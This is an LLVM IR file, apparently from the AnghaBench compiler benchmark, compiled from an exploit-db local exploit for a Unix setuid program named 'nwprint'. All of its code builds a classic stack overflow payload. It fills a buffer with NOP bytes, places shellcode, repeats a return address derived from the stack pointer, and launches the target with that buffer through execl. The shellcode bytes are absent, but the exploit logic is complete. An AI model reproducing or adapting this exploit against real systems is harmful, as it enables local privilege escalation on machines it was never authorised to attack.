; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_25333.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/unix/local/extr_25333.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@scode = common dso_local global i8* null, align 8
@.str = private unnamed_addr constant [22 x i8] c"shellcode length: %d\0A\00", align 1
@.str.1 = private unnamed_addr constant [16 x i8] c"address: 0x%lx\0A\00", align 1
@_PATH = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [8 x i8] c"nwprint\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i64, align 8
  %10 = alloca i64*, align 8
  %11 = alloca i8*, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %12 = load i8*, i8** @scode, align 8
  %13 = call i32 @strlen(i8* %12)
  store i32 %13, i32* %7, align 4
  store i32 0, i32* %8, align 4
  %14 = load i32, i32* %4, align 4
  %15 = icmp sgt i32 %14, 1
  br i1 %15, label %16, label %21

16:                                               ; preds = %2
  %17 = load i8**, i8*** %5, align 8
  %18 = getelementptr inbounds i8*, i8** %17, i64 1
  %19 = load i8*, i8** %18, align 8
  %20 = call i32 @strtoul(i8* %19, i32* null, i32 0)
  store i32 %20, i32* %8, align 4
  br label %21

21:                                               ; preds = %16, %2
  %22 = call i64 @malloc(i32 1024)
  %23 = inttoptr i64 %22 to i8*
  store i8* %23, i8** %11, align 8
  %24 = load i8*, i8** %11, align 8
  %25 = call i32 @memset(i8* %24, i32 0, i32 1024)
  store i32 0, i32* %6, align 4
  br label %26

26:                                               ; preds = %36, %21
  %27 = load i32, i32* %6, align 4
  %28 = load i32, i32* %7, align 4
  %29 = sub nsw i32 901, %28
  %30 = icmp slt i32 %27, %29
  br i1 %30, label %31, label %39

31:                                               ; preds = %26
  %32 = load i8*, i8** %11, align 8
  %33 = load i32, i32* %6, align 4
  %34 = sext i32 %33 to i64
  %35 = getelementptr inbounds i8, i8* %32, i64 %34
  store i8 -112, i8* %35, align 1
  br label %36

36:                                               ; preds = %31
  %37 = load i32, i32* %6, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %6, align 4
  br label %26

39:                                               ; preds = %26
  %40 = load i32, i32* %7, align 4
  %41 = sext i32 %40 to i64
  %42 = call i32 @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str, i64 0, i64 0), i64 %41)
  %43 = load i32, i32* %7, align 4
  %44 = sub nsw i32 901, %43
  store i32 %44, i32* %6, align 4
  br label %45

45:                                               ; preds = %61, %39
  %46 = load i32, i32* %6, align 4
  %47 = icmp slt i32 %46, 901
  br i1 %47, label %48, label %64

48:                                               ; preds = %45
  %49 = load i8*, i8** @scode, align 8
  %50 = load i32, i32* %6, align 4
  %51 = load i32, i32* %7, align 4
  %52 = sub nsw i32 901, %51
  %53 = sub nsw i32 %50, %52
  %54 = sext i32 %53 to i64
  %55 = getelementptr inbounds i8, i8* %49, i64 %54
  %56 = load i8, i8* %55, align 1
  %57 = load i8*, i8** %11, align 8
  %58 = load i32, i32* %6, align 4
  %59 = sext i32 %58 to i64
  %60 = getelementptr inbounds i8, i8* %57, i64 %59
  store i8 %56, i8* %60, align 1
  br label %61

61:                                               ; preds = %48
  %62 = load i32, i32* %6, align 4
  %63 = add nsw i32 %62, 1
  store i32 %63, i32* %6, align 4
  br label %45

64:                                               ; preds = %45
  %65 = load i8*, i8** %11, align 8
  %66 = getelementptr inbounds i8, i8* %65, i64 901
  %67 = bitcast i8* %66 to i64*
  store i64* %67, i64** %10, align 8
  %68 = call i32 (...) @get_sp()
  %69 = load i32, i32* %8, align 4
  %70 = sub nsw i32 %68, %69
  %71 = sext i32 %70 to i64
  store i64 %71, i64* %9, align 8
  %72 = call i32 @printf(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.1, i64 0, i64 0), i64 %71)
  store i32 0, i32* %6, align 4
  br label %73

73:                                               ; preds = %84, %64
  %74 = load i32, i32* %6, align 4
  %75 = icmp slt i32 %74, 30
  br i1 %75, label %76, label %87

76:                                               ; preds = %73
  %77 = load i64, i64* %9, align 8
  %78 = trunc i64 %77 to i32
  %79 = sext i32 %78 to i64
  %80 = load i64*, i64** %10, align 8
  %81 = load i32, i32* %6, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds i64, i64* %80, i64 %82
  store i64 %79, i64* %83, align 8
  br label %84

84:                                               ; preds = %76
  %85 = load i32, i32* %6, align 4
  %86 = add nsw i32 %85, 1
  store i32 %86, i32* %6, align 4
  br label %73

87:                                               ; preds = %73
  %88 = load i32, i32* @_PATH, align 4
  %89 = load i8*, i8** %11, align 8
  %90 = call i32 @execl(i32 %88, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.2, i64 0, i64 0), i8* %89, i32* null)
  ret i32 0
}

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @strtoul(i8*, i32*, i32) #1

declare dso_local i64 @malloc(i32) #1

declare dso_local i32 @memset(i8*, i32, i32) #1

declare dso_local i32 @printf(i8*, i64) #1

declare dso_local i32 @get_sp(...) #1

declare dso_local i32 @execl(i32, i8*, i8*, i32*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
